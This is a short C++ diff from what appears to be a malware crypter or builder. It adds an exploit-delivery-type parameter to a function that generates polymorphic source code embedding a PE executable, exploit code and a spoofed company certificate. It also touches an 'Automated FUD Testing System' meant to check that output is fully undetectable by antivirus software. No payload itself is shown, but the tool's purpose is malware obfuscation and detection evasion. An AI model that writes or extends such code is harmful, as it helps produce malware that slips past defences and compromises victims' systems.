@@ -1646,7 +1646,7 @@ public:
             }
             
             // Create polymorphic source code with embedded PE and exploits
-            std::string sourceCode = generatePolymorphicSourceWithExploits(originalPEData, company, cert, archInfo.second, benignCode, exploitCode, exploitIncludes);
+            std::string sourceCode = generatePolymorphicSourceWithExploits(originalPEData, company, cert, archInfo.second, benignCode, exploitCode, exploitIncludes, exploitType);
             
             // Save source for debugging/manual compilation
             std::string sourceFilename = "temp_" + randomEngine.generateRandomName() + ".cpp";
@@ -1706,7 +1706,8 @@ public:
                                                      const std::string& architecture,
                                                      const std::string& benignCode,
                                                      const std::string& exploitCode,
-                                                     const std::string& exploitIncludes) {
+                                                     const std::string& exploitIncludes,
+                                                     ExploitDeliveryType exploitType) {
         
         std::string varName = "embedded_" + randomEngine.generateRandomName();
         std::string functionName = "extract_" + randomEngine.generateRandomName();
@@ -2800,7 +2801,7 @@ public:
         std::cout << "[LAUNCH] Starting Automated FUD Testing System...\n\n";
         
         auto combinations = generateTestCombinations();
-        int totalTests = combinations.size();
+        int totalTests = static_cast<int>(combinations.size());
         int currentTest = 0;
         
         std::cout << "[INFO] Testing " << totalTests << " combinations...\n\n";
